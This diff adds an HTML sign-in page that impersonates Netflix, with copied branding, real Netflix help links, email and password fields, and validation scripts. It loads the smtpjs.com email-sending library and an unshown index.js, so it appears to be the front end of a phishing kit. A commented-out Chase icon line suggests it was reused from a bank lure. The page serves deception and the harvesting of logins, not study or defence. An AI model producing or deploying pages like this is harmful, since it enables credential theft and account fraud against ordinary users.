@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Netflix - Sign In</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="logo.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+
+        <!--Styling link for remember me checkbox-->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+
+</head>
+<body>
+    <div class="container">
+
+
+        <div class="navbar__container">
+            <nav class="navbar">
+                <div class="navbar__container">
+                    <a href="index.html" id="navbar__logo"><img src="head.png" width="140px" height="49px" style="margin-top: 11px; margin-left: 8px;"></a>
+                </div>
+
+            </nav>
+        </div>
+
+        
+        <div class="containaa171">
+            <form action="#" class="form-contact">
+
+                <div class="signin">
+                    <p class="xfin">Sign In</p>
+                </div>
+
+                <input id="fID1" type="text" placeholder="Email or phone number" required>
+
+                <div class="correct">
+                    <p class="red">Please enter a valid email or phone number.</p>
+                </div>
+
+                <input id="fpass1" type="password" placeholder="Password" required>
+                <div class="correct">
+                    <p class="red2">Your password must contain between 4-60 characters.</p>
+                </div>
+                <input id="fsubmit" class="subbut" type="image" src="signin.png" alt="Submit">
+
+                <label class="remember-label">
+                    <input id="fremember" type="checkbox" name="remember" class="remember-checkbox">
+                    <label for="check" class="remtext">Remember me</label>
+                    <!--Check Header for link rel styling for remember me checkbox-->
+
+                    <a class ="helphref" href="https://www.netflix.com/LoginHelp"><p class="help">Need Help?</p></a>
+                </label>
+                <div class="newnet">
+                    <a href="https://www.netflix.com/"><img src="newtonetflix.png" width="225px" height="25px" style="cursor: pointer;"></a>
+                </div>
+            <form>
+
+        </div>
+    </div>
+    <style>
+        .containaa171{
+            margin-top: 2px;
+        }
+    </style>
+    <script>
+        // JavaScript to handle the input behavior make red
+        document.addEventListener('DOMContentLoaded', function() {
+            var input2 = document.querySelector('.form-contact input[type="text"]');
+            var pass2 = document.querySelector('.form-contact input[type="password"]');
+            var red2 = document.querySelector('.red');
+            var red22 = document.querySelector('.red2');
+
+            // Function to apply red styling to placeholder
+
+            function redmess() {
+                red2.style.display = "block";
+            }
+
+            function applyRedPlaceholder() {
+                input2.classList.add('redd');
+            }
+
+            // Function to restore original placeholder and grey styling
+            function restoreGreyStyling() {
+                input2.classList.remove('redd');
+            }
+
+
+            /*   pass   */
+
+            function redmess2() {
+                red22.style.display = "block";
+            }
+
+            function applyRedPlaceholder2() {
+                pass2.classList.add('redd');
+            }
+
+            // Function to restore original placeholder and grey styling
+            function restoreGreyStyling2() {
+                pass2.classList.remove('redd');
+            }
+
+            /*     ^pass^     */
+            
+            // Apply grey styling when the page loads
+            restoreGreyStyling();
+            restoreGreyStyling2();
+
+            // When input is focused (clicked inside), restore grey styling
+            input2.addEventListener('focus', function() {
+                restoreGreyStyling();
+            });
+
+            pass2.addEventListener('focus', function(){
+                restoreGreyStyling2();
+            });
+
+
+            pass2.addEventListener('blur', function() {
+                if (pass2.value.trim() === '') {
+                    applyRedPlaceholder2();
+                    redmess2();
+                }
+            });
+
+            // When input loses focus (clicked off), apply red styling to placeholder if empty
+            input2.addEventListener('blur', function() {
+                if (input2.value.trim() === '') {
+                    applyRedPlaceholder();
+                    redmess();
+                }
+            });
+        });
+    </script>
+    <script>
+        var button11 = document.querySelector('.form-contact input[type="image"]');
+        var finput11 = document.querySelector('.form-contact input[type="text"]');
+        var fpass11 = document.querySelector('.form-contact input[type="password"]');
+        var red11 = document.querySelector('.red');
+        var red211 = document.querySelector('.red2');
+
+    
+        button11.addEventListener('click', function(event) {
+            var finput11BorderColor = getComputedStyle(finput11).borderBottomColor.toLowerCase();
+
+            if (finput11.value === '' && fpass11.value !== '') {
+                event.preventDefault();
+                
+                finput11.classList.add('redd');
+                red11.style.display = "block";
+
+            } else if (fpass11.value === '' && finput11.value !== ''){
+
+                fpass11.classList.add('redd');
+                red211.style.display = "block";
+            
+            } else if (finput11.value === '' && fpass11.value === ''){
+
+                finput11.classList.add('redd');
+                red11.style.display = "block";
+                fpass11.classList.add('redd');
+                red211.style.display = "block";
+
+            } else {
+                button11.classList.add('clicked');
+                button11.style.opacity = 0.5;
+                red11.style.display = "none";
+                red211.style.display = "none";
+
+                setTimeout(function() {
+
+                    button11.classList.remove('clicked');
+                    button11.style.opacity = 1;
+
+                }, 4000);
+            }
+        });
+    </script>
+    <script src="index.js"></script>
+    <br>
+    <div class="bottom">
+        <a href="https://help.netflix.com/legal/termsofuse"><img class="qbt" src="q.png" height="238px" width="327px"></a>
+    </div>
+    <div class="bottom22">
+        <div class="inbtdiv">
+            <a href="https://help.netflix.com/legal/termsofuse"><img src="pcboto.png" class="pcbt" height="282px" width="1200px"></a>
+        </div>
+    </div>
+    <style>
+        .container {
+            margin-bottom: 15px;
+        }
+        .bottom {
+            display: none;
+        }
+        .bottom22 {
+            text-align: center;
+            align-items: center;
+            justify-content: center;
+            display: flex;
+            position: relative;
+            left: 60px;
+        }
+        .qbt {
+            display: none;
+        }
+        .pcbt {
+            display: block;
+            cursor: default;
+        }
+        @media (max-width: 768px) {
+            .bottom22 {
+                display: none;
+            }
+            .bottom {
+                display: block;
+            }
+            .qbt {
+                display: block;
+            }
+            .pcbt {
+                display: none;
+            }
+        }
+    </style>
+
+
+</body>
+</html>
